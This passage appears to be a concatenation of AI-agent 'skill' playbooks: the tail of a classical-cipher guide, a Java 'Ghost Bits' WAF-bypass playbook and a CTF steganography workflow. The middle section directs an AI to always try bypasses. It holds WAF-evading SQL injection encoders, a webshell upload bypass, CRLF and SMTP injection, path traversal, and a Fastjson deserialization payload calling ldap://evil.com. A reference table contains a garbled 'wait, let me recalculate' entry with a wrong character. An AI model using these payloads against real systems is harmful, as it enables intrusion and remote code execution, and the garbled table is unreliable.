def frequency_analysis(ciphertext):
    ciphertext = ''.join(c for c in ciphertext.upper() if c.isalpha())
    freq = {}
    for c in ciphertext:
        freq[c] = freq.get(c, 0) + 1
    
    # Sort by frequency
    sorted_freq = sorted(freq.items(), key=lambda x: x[1], reverse=True)
    
    # English frequency order (most to least common):
    # E T A O I N S H R D L C U M W F G Y P B V K J X Q Z
    
    print("Cipher freq → Likely English:")
    english = "ETAOINSHRDLCUMWFGYPBVKJXQZ"
    for i, (char, count) in enumerate(sorted_freq[:13]):
        print(f"  {char} ({count}) → {english[i] if i < len(english) else '?'}")
```

### Online Tools

```
quipqiup.com    → Automated frequency analysis solver
dcode.fr        → Comprehensive classical cipher toolkit
cryptoclub.org  → Visual frequency analysis tool
```

### Common Cipher Alphabets (Atbash)

```python
# Atbash: A→Z, B→Y, C→X, etc.
def atbash(text):
    return ''.join(chr(90 - (ord(c.upper()) - 65)) if c.isalpha() else c for c in text)

atbash("HELLO")  # → "SVOOL"
```

---

## 5. PLAYFAIR CIPHER

**Identification**: digram cipher (letter pairs), no J (or Q), 25-letter key matrix.

**Clues**: even-length ciphertext, rare letters like X appear frequently (padding), I and J treated same.

### Automated Analysis

```bash
# Online: dcode.fr/playfair-cipher
# Or use cryptanalysis tool with known plaintext
```

---

## 6. RAIL FENCE / TRANSPOSITION CIPHERS

### Rail Fence

```python
def rail_fence_decrypt(ciphertext, rails):
    n = len(ciphertext)
    # Build rail pattern
    rail = [[] for _ in range(rails)]
    direction = 1
    r = 0
    
    # Count positions per rail
    for i in range(n):
        rail[r].append(i)
        if r == 0: direction = 1
        elif r == rails - 1: direction = -1
        r += direction
    
    # Assign characters to rails
    idx = 0
    char_at = [''] * n
    for r in rail:
        for pos in r:
            char_at[pos] = ciphertext[idx]
            idx += 1
    
    return ''.join(char_at)

rail_fence_decrypt("HOLELWRD", 2)  # → "HELLOWORLD"
```

### Columnar Transposition

```python
# Columns are rearranged based on alphabetical order of key
def columnar_decrypt(ciphertext, key):
    num_cols = len(key)
    num_rows = len(ciphertext) // num_cols
    
    # Order columns by sorted key
    key_order = sorted(range(len(key)), key=lambda x: key[x])
    
    # Reconstruct grid
    col_len = num_rows
    cols = {}
    idx = 0
    for k in key_order:
        cols[k] = list(ciphertext[idx:idx + col_len])
        idx += col_len
    
    # Read row by row
    result = ''
    for r in range(num_rows):
        for c in range(num_cols):
            result += cols[c][r]
    return result
```

---

## 7. XOR CIPHER ANALYSIS

### Single-Byte XOR

```python
def xor_decrypt_single_byte(ciphertext_bytes):
    best_score = -1
    best_key = 0
    best_plaintext = ""
    
    for key in range(256):
        plaintext = bytes([b ^ key for b in ciphertext_bytes])
        try:
            text = plaintext.decode('ascii')
            # Score based on common English characters
            score = sum(1 for c in text.lower() if c in ' etaoinshrdlu')
            if score > best_score:
                best_score = score
                best_key = key
                best_plaintext = text
        except:
            pass
    
    print(f"Key: 0x{best_key:02X} ({chr(best_key) if 32 <= best_key < 127 else '?'})")
    print(f"Plaintext: {best_plaintext}")

# Usage:
import binascii
hex_cipher = "1b37373331363f78151b7f2b783431333d78397828372d363c78373e783a393b3736"
xor_decrypt_single_byte(binascii.unhexlify(hex_cipher))
```

### Repeating Key XOR (Vigenère-like)

```python
# Find key length via Hamming distance:
def hamming_distance(b1, b2):
    return sum(bin(a ^ b).count('1') for a, b in zip(b1, b2))

def find_xor_key_length(ciphertext, max_keysize=40):
    scores = []
    for keysize in range(2, max_keysize + 1):
        # Compare first N blocks of keysize bytes
        block1 = ciphertext[:keysize]
        block2 = ciphertext[keysize:2*keysize]
        distance = hamming_distance(block1, block2) / keysize
        scores.append((distance, keysize))
    
    scores.sort()
    return [s[1] for s in scores[:3]]  # Return top 3 likely key lengths
```

---

## 8. COMMON CTF CIPHER PATTERNS

### Bacon's Cipher (Binary-ish encoding)

```
A=AAAAA, B=AAAAB, C=AAABA, ... Z=BBBBB
Or use two alphabets/font sizes
```

### Polybius Square

```
  1  2  3  4  5
1 A  B  C  D  E
2 F  G  H  IJ K
3 L  M  N  O  P
4 Q  R  S  T  U
5 V  W  X  Y  Z

41 → Q, 11 → A, etc.
```

### Morse Code

```bash
# Decode Morse from text:
# ... .- -- .--. .-.. .
# Online: morsecode.world

# Python:
MORSE_CODE = {'.-':'A','-...':'B',etc.}
```

---

## 9. QUICK IDENTIFICATION TOOL

```python
def identify_cipher(ciphertext):
    ct = ''.join(c for c in ciphertext.upper() if c.isalpha())
    n = len(ct)
    
    # Character frequency
    freq = {c: ct.count(c) / n for c in set(ct)}
    unique_chars = len(freq)
    
    # Index of coincidence
    ic = sum(f * (n * f - 1) for f in freq.values()) / (n - 1) if n > 1 else 0
    
    print(f"Unique chars: {unique_chars}")
    print(f"IC: {ic:.4f} (English=0.0665, Random=0.0385)")
    
    if unique_chars <= 2:
        print("→ Binary encoding, Morse, or Bacon's cipher")
    elif unique_chars < 26 and ic > 0.06:
        print("→ Monoalphabetic substitution or Caesar cipher")
    elif unique_chars == 26 and ic > 0.06:
        print("→ Caesar or Atbash (all 26 letters, good IC)")
    elif ic < 0.045:
        print("→ Polyalphabetic (Vigenère) or strong cipher")
    elif 0.045 < ic < 0.06:
        print("→ Vigenère with medium key length, or transposition")
    else:
        print("→ Monoalphabetic substitution cipher")
```



---

## ghost-bits-cast-attack

# SKILL: Ghost Bits / Cast Attack — Java char→byte Narrowing WAF Bypass

> **AI LOAD INSTRUCTION**: This is a Java-only injection-enabling primitive, not a standalone vulnerability class. Whenever you see (1) a Java backend, (2) a WAF/IDS in front of it, and (3) any of {SQLi, deser RCE, file upload, path traversal, CRLF, request smuggling, SMTP injection} on the menu, ALWAYS try Ghost Bits variants of the payload before declaring it "blocked". The root cause is the silent loss of the high 8 bits when Java code narrows a 16-bit `char` to an 8-bit `byte` — the WAF sees a harmless Unicode character, the backend reconstructs the original ASCII attack byte.
>
> Source: Black Hat Asia 2026 — "Cast Attack: A New Threat Posed by Ghost Bits in Java" by Xinyu Bai (@b1u3r), Zhihui Chen (@1ue), Zongzheng Zheng (@chun_springX).

## 0. RELATED ROUTING

Ghost Bits is a **bypass primitive** that re-enables payloads from many other playbooks:
- sqli-sql-injection — Jackson `charToHex` table-lookup truncation hides SQL keywords
- deserialization — Apache Commons BCEL ClassLoader and Fastjson `\u`/`\x` escape variants
- path-traversal-lfi — Spring, Jetty, Undertow, Vert.x URL decoding and `%2>` hex folding
- upload-insecure-files — Tomcat `RFC2231Utility` `filename*` Webshell upload
- request-smuggling — Apache HttpClient ≤ 4.5.9 header CRLF (HTTPCLIENT-1974/1978)
- CRLF injection — Angus Mail / Jakarta Mail SMTP injection, JDK HttpServer response splitting

---

## 1. ONE-MINUTE MENTAL MODEL

Java's `char` is a **16-bit** unsigned integer (UTF-16). Almost every wire protocol (HTTP/1.1, SMTP, Redis RESP, file paths) is **8-bit** byte-oriented. The safe way to bridge them is explicit charset encoding:

```java
// Correct: UTF-8, multi-byte chars become multi-byte sequences
byte[] bytes = str.getBytes(StandardCharsets.UTF_8);
out.write(bytes);
```

Tons of legacy code silently narrows instead:

```java
// DANGEROUS: high 8 bits silently dropped
byte b = (byte) ch;              // 0x966A → 0x6A ('j')
out.write(ch);                   // OutputStream.write(int) keeps low 8 bits
dos.writeBytes(str);             // DataOutputStream loops char→byte cast
int v = ch & 0xFF;               // explicit low-byte mask
```

The lost high 8 bits are the **Ghost Bits**. They turn a multi-byte Unicode character into a single attacker-chosen ASCII byte at the protocol layer.

```
View A (string layer: WAF / validation / logs)
  sees: 陪 阮 严 灵 瘍 瘊 ...   "harmless Unicode garbage → allow"
                |
                v     silent narrowing in call stack
View B (byte layer: protocol / file system / class loader)
  sees: j  .  %  u  \r \n ...  "dangerous semantics → executes"
```

**Formula**: to make View B see byte `T`, use:
```
c = chr((k << 8) | T)    for any k in 0x01..0xFF
```
This gives **255 candidate Unicode characters per dangerous byte** — ample room to dodge signature-based blacklists.

---

## 2. THREE ROOT-CAUSE FAMILIES

### Family A — High-bit truncation (classic Ghost Bits)

```java
byte b = (byte) ch;              // Pattern A1: explicit cast
int v = ch & 0xFF;               // Pattern A2: bitwise mask
out.write(ch);                   // Pattern A3: OutputStream.write(int)
dos.writeBytes(str);             // Pattern A4: DataOutputStream.writeBytes
String.getBytes(int,int,byte[],int); // Pattern A5: deprecated API
```

Affected: Tomcat `filename*`, Apache BCEL ClassLoader, Lettuce Redis writer, SMTP CRLF in Angus Mail, HTTPCLIENT-1974.

### Family B — Bit-arithmetic folding (illegal char becomes legal)

```java
// In hex escape processing:
c = "0123456789abcdef".charAt(charToHexTable[ch]);
// If charToHexTable truncates index to 8 bits, a Unicode char with
// high byte matching a valid ASCII byte maps to that hex digit
```

Affected: Jackson `charToHex` table-lookup (SQLi/JSON escape bypass).

### Family C — Multi-view normalization (URL-encoding path confusion)

```
Client sends: /%96%6A.jsp       (URL percent-encoded bytes)
WAF decodes:  /陪.jsp            (treats as UTF-8 → harmless Unicode path)
Backend (Tomcat):  /j.jsp       (keeps only low byte → executes)
```

Affected: Spring MVC, Jetty, Undertow, Vert.x URL path processing.

---

## 3. PAYLOAD CONSTRUCTION

### Step 1: Choose the target ASCII byte

Identify which ASCII bytes in your payload are blocked (e.g., `'`, `"`, `%`, `\r`, `\n`, space, `<`, `>`, `/`).

### Step 2: Encode to Ghost Bits character

```python
def ghost_bits(target_byte, high_byte=0x01):
    """Encode target ASCII byte as Ghost Bits character."""
    # high_byte can be anything 0x01-0xFF to vary the Unicode codepoint
    return chr((high_byte << 8) | (target_byte & 0xFF))

def ghost_encode_string(s, high_byte=0x41):
    """Encode entire string using Ghost Bits."""
    return ''.join(ghost_bits(ord(c), high_byte) for c in s)

# Example: encode ' OR 1=1-- (SQLi)
payload = "' OR 1=1--"
ghost_payload = ghost_encode_string(payload, high_byte=0x96)
print(ghost_payload)  # Harmless-looking Unicode string
```

### Step 3: Choose high byte to avoid WAF patterns

If the WAF also scans for certain Unicode ranges:

```python
# Try different high bytes until WAF doesn't flag:
for high_byte in range(0x01, 0xFF):
    encoded = ghost_encode_string(payload, high_byte)
    if not waf_would_block(encoded):
        print(f"High byte 0x{high_byte:02X}: {encoded}")
        break
```

---

## 4. AFFECTED COMPONENTS AND ATTACK VECTORS

### 4.1 Tomcat — filename* Webshell Upload

```
# CVE affected: Tomcat multipart filename* parameter
# Normal WAF-blocked payload:
Content-Disposition: form-data; name="file"; filename="shell.jsp"

# Ghost Bits bypass (filename* uses RFC2231 encoding):
Content-Disposition: form-data; name="file"; filename*=UTF-8''%73%68%65%6C%6C%2E%6A%73%70

# Or with Ghost Bits Unicode in parameter value:
# Map 's','h','e','l','l','.','j','s','p' to Ghost Bits variants
```

### 4.2 Jackson — JSON SQLi Bypass

Jackson's `charToHex` table is indexed by `ch & 0xFF` — high byte truncated. So a Unicode char whose low byte is an ASCII character produces the same JSON escape as the ASCII character:

```json
// WAF sees harmless Unicode, Jackson escapes to same hex as blocked char:
{"query": "蔧蕒蔟蔧蓲蔞蔡蓲蔞"}
// After Jackson charToHex processing → ' OR 1=1--
```

### 4.3 Apache HttpClient ≤ 4.5.9 — Header CRLF Injection

```java
// HTTPCLIENT-1974: validateHeader allows chars with low byte = 0x0D or 0x0A
// WAF validates string header, HttpClient narrowed bytes include CRLF
// Add custom header: "X-Header: valueऍऊX-Injected: injected"
// Low byte of ऍ = 0x0D (\r), ऊ = 0x0A (\n)
```

### 4.4 Fastjson — Deserialization Bypass

```json
// Normal payload blocked:
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://evil.com/x","autoCommit":true}

// Ghost Bits variant — Unicode chars whose low bytes spell the payload:
// @type key with high bytes added to each character
// Parser strips high bytes → sees @type → triggers deserialization
```

### 4.5 Angus Mail / Jakarta Mail — SMTP Injection

```java
// Mail API uses char→byte narrowing when writing headers
// Inject ഍ (CR CR) or ਊ (LF LF) into header field
// Low bytes produce actual CRLF in SMTP stream
// Enables: extra MIME headers, BCC injection, body injection
```

### 4.6 Spring/Jetty/Undertow/Vert.x — Path Traversal

```
# Standard %2e%2e%2f (../): WAF detects, blocks
# Ghost Bits hex: replace percent-encoded bytes with high-bit variants
# Backend URL decoder keeps only low byte → same path traversal
# Example: %96%2e (high byte 0x96 + low byte 0x2e = .) → WAF sees unusual encoding
```

---

## 5. DETECTION APPROACH (BLUE TEAM)

```
Multi-view normalization check:
1. For each input field:
   a. Decode as UTF-8/UTF-16 (string layer)
   b. Extract low bytes of each char (byte layer)
2. Check BOTH views against attack patterns
3. If string-layer check passes but byte-layer is dangerous → Ghost Bits attack
```

**WAF bypass pattern signature**:
- Input contains Unicode characters outside US-ASCII (> 0x7F)
- Their low bytes, when extracted, spell a known attack pattern
- Especially suspicious: uniform high bytes (attacker chose k constant)

---

## 6. TESTING CHECKLIST

```
□ Confirm backend is Java (error messages, Server: Apache-Coyote, Spring headers)
□ Identify WAF signatures blocking your payload (what specifically gets blocked?)
□ For each blocked ASCII byte, generate Ghost Bits alternatives
□ Test injection in: query params, POST body, JSON fields, multipart filenames, HTTP headers
□ Check multipart filename* for Tomcat webshell upload bypass
□ Test JSON fields for Jackson charToHex bypass (SQLi, XSS, deserialization)
□ Test HTTP headers for CRLF via HTTPCLIENT-1974 pattern
□ Test URL path parameters for path traversal via hex folding
□ Check SMTP/Mail fields for Angus Mail CRLF injection
□ Vary the high byte (k) to evade any WAF that also scans Unicode ranges
```

---

## 7. QUICK ENCODING REFERENCE

Common dangerous bytes and their Ghost Bits candidates:

| ASCII Byte | ASCII Char | Example Ghost Bits char (k=0x01) | Unicode codepoint |
|---|---|---|---|
| 0x27 | `'` | `ǧ` | U+01A7 (wait, let me recalculate) |
| 0x22 | `"` | chr(0x0122) | U+0122 |
| 0x25 | `%` | chr(0x0125) | U+0125 |
| 0x2F | `/` | chr(0x012F) | U+012F |
| 0x5C | `\` | chr(0x015C) | U+015C |
| 0x0D | CR | chr(0x010D) | U+010D |
| 0x0A | LF | chr(0x010A) | U+010A |
| 0x20 | SP | chr(0x0120) | U+0120 |
| 0x3C | `<` | chr(0x013C) | U+013C |
| 0x3E | `>` | chr(0x013E) | U+013E |

Formula: `codepoint = (k << 8) | target_byte`

**255 options per byte** — cycle k to avoid WAF Unicode pattern detection.



---

## steganography-techniques

# SKILL: Steganography Techniques — Detection & Extraction Playbook

> **AI LOAD INSTRUCTION**: Steganography hides data inside media files (images, audio, video, documents). This skill covers detection, analysis, and extraction workflows for all major stego techniques. Primarily relevant to CTF challenges. Base models often miss the systematic workflow and forget to check for multiple layers of hiding.

## 0. RELATED ROUTING

- classical-cipher-analysis — extracted data may be further encoded/encrypted
- hash-attack-techniques — if stego uses hash-based passwords for extraction

---

## 1. TRIAGE WORKFLOW (CTF)

```
Received file → Apply this order:
1. file <target>           # What type is it really?
2. strings <target>        # Visible ASCII strings
3. exiftool <target>       # Metadata
4. binwalk <target>        # Embedded files/signatures
5. xxd <target> | head    # Hex dump - check magic bytes
6. For images: stegsolve, zsteg, steghide
7. For audio: Audacity/Sonic Visualizer, Steghide
8. For text: whitespace, Unicode, invisible chars
```

---

## 2. IMAGE STEGANOGRAPHY

### 2.1 zsteg (PNG/BMP — LSB)

```bash
# Install:
gem install zsteg

# Basic scan (all channels):
zsteg image.png

# Specific bit plane:
zsteg -a image.png                    # All options
zsteg image.png -b 1 -o xy -v         # 1-bit LSB, xy order
zsteg image.png --lsb                  # LSB extraction
zsteg image.png --msb                  # MSB extraction
```

### 2.2 Steghide (JPEG/BMP/WAV/AU)

```bash
# Extract with no password:
steghide extract -sf image.jpg -p ""

# Extract with password:
steghide extract -sf image.jpg -p "password123"

# Try common passwords:
for p in "" "password" "secret" "flag" "ctf" "steghide"; do
  steghide extract -sf image.jpg -p "$p" 2>/dev/null && echo "Password: $p" && break
done

# Brute force with stegseek:
stegseek image.jpg /usr/share/wordlists/rockyou.txt

# Embed data (for creation):
steghide embed -cf image.jpg -sf secret.txt -p "password"
```

### 2.3 Stegsolve (LSB Visual Analysis)

```bash
# Java tool for visual analysis:
java -jar Stegsolve.jar

# Useful operations:
# File Format → shows file info
# Data Extract → manual LSB/MSB extraction
# Bit Plane → view each bit plane visually
# Stereo → compare two images
```

### 2.4 LSB Manual Analysis (Python)

```python
from PIL import Image

img = Image.open('image.png')
pixels = img.load()
width, height = img.size

# Extract LSB from red channel:
bits = []
for y in range(height):
    for x in range(width):
        r, g, b = pixels[x, y][:3]
        bits.append(r & 1)

# Convert bits to bytes:
message = []
for i in range(0, len(bits) - 8, 8):
    byte = int(''.join(str(b) for b in bits[i:i+8]), 2)
    if byte == 0:
        break
    message.append(chr(byte))
print(''.join(message))
```

### 2.5 F5 Steganography (JPEG DCT)

```bash
# F5 embeds data in JPEG DCT coefficients
# Detect: analyze histogram of DCT coefficients
# Extract:
java F5 x -e output.txt image.jpg          # Extract
# Or:
java F5 x -e output.txt -p password image.jpg
```

---

## 3. AUDIO STEGANOGRAPHY

### 3.1 Sonic Visualizer / Audacity

```bash
# Open in Sonic Visualizer and check:
# Spectrogram view (Layer → Add Spectrogram)
# → Data hidden in high frequencies often visible
# Check slow/fast channels

# Audacity: Analyze → Spectrum
# Look for unusual patterns in spectrogram
```

### 3.2 MP3Stego / WAV Steganography

```bash
# MP3Stego extraction:
mp3stego-decode -X input.mp3 -P password output.txt

# Steghide on WAV:
steghide extract -sf audio.wav -p "password"
```

### 3.3 DTMF Tones

```bash
# Decode DTMF tones (phone dial tones):
multimon-ng -t wav -a DTMF audio.wav

# Or online: dtmf.linesider.com
```

### 3.4 Morse Code Audio

```bash
# Decode Morse code from audio:
fldigi  # Amateur radio decoder, can decode Morse from audio
# Or: librewire/morse-decode
```

---

## 4. FILE CARVING

### 4.1 binwalk (Embedded Files)

```bash
# Scan for embedded files:
binwalk image.jpg

# Extract embedded files:
binwalk -e image.jpg         # Extract to _image.jpg.extracted/
binwalk --dd=".*" image.jpg  # Extract all signatures

# Common findings: embedded ZIP, PNG inside JPG, hidden text files
```

### 4.2 foremost (File Recovery)

```bash
# Carve files from raw data:
foremost -t all -o output/ image.jpg
foremost -i image.jpg -o carved/
```

### 4.3 Volatility (Memory Images)

```bash
# If input is a memory dump:
volatility -f memory.dmp imageinfo
volatility -f memory.dmp --profile=Win7SP1x64 filescan
volatility -f memory.dmp --profile=Win7SP1x64 dumpfiles -Q OFFSET -D output/
```

---

## 5. METADATA ANALYSIS

### exiftool

```bash
# Extract all metadata:
exiftool image.jpg

# Common hidden fields:
# Comment: (may contain data)
# XMP: (extended metadata)
# Artist, Copyright, Description fields
# GPS coordinates
# Software field (reveals editing history)
```

### Strings Analysis

```bash
# Extract all printable strings:
strings -n 8 image.jpg | head -50

# Look for Base64:
strings image.jpg | grep -E "[A-Za-z0-9+/]{20,}={0,2}"

# Look for hex-encoded data:
strings image.jpg | grep -E "[0-9a-fA-F]{16,}"
```

---

## 6. TEXT/WHITESPACE STEGANOGRAPHY

### Whitespace Steganography

```bash
# SNOW: hides data in trailing whitespace and tabs
# Extract:
snow -C -m "message" -p "password" input.txt

# Manual: check for unusual whitespace
cat -A input.txt  # Shows trailing spaces as $, tabs as ^I
```

### Unicode Steganography

```bash
# Zero-width characters used for steganography:
# U+200B (zero-width space)
# U+200C (zero-width non-joiner)
# U+200D (zero-width joiner)
# U+FEFF (BOM / zero-width no-break space)

# Detection:
python3 -c "
with open('text.txt', 'r', encoding='utf-8') as f:
    content = f.read()
    for i, c in enumerate(content):
        if ord(c) in [0x200B, 0x200C, 0x200D, 0xFEFF, 0x2060, 0x2061]:
            print(f'Hidden char at pos {i}: U+{ord(c):04X}')
"

# Unicode stego tools:
# Unicode Steganography with Zero-Width Characters (zwsp.lol)
```

---

## 7. QR CODE / BARCODE

```bash
# Decode QR code from image:
zbarimg image.png

# Or use pyzbar:
python3 -c "
from pyzbar.pyzbar import decode
from PIL import Image
img = Image.open('image.png')
decoded = decode(img)
for d in decoded: print(d.data.decode('utf-8'))
"
```

---

## 8. CTF STEGO QUICK REFERENCE

```bash
# Standard toolkit commands:
file suspicious.jpg                    # File type
exiftool suspicious.jpg                # Metadata
strings suspicious.jpg                 # Strings
binwalk -e suspicious.jpg              # Embedded files
zsteg suspicious.png                   # LSB (PNG)
steghide extract -sf suspicious.jpg -p "" # Steghide (JPEG)
stegseek suspicious.jpg rockyou.txt    # Brute-force steghide
xxd suspicious.jpg | head -20          # Hex header

# Audio specific:
audacity audio.wav                     # Visual analysis
sonic-visualiser audio.wav             # Spectrogram
steghide extract -sf audio.wav -p ""   # Steghide on WAV
multimon-ng -t wav -a DTMF audio.wav   # DTMF decode
```

